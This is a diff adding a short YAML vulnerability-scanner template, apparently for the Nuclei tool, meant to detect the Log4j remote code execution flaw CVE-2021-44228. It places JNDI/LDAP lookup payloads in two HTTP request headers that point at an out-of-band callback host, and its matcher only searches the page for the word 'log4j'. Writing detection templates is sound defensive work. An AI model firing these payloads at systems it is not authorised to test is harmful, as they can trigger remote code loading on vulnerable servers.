@@ -1,0 +1,24 @@
+id: log4j-rce
+info:
+  name: Log4j Remote Code Execution (CVE-2021-44228)
+  author: slapper
+  severity: critical
+  description: Detects Log4j RCE vulnerability
+  tags:
+    - cve
+    - log4j
+    - rce
+  references:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+matchers:
+  - type: http
+    path: "/"
+    search:
+      - pattern: "log4j"
+        mode: word
+requests:
+  - method: GET
+    path: "/"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
+      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/a}"
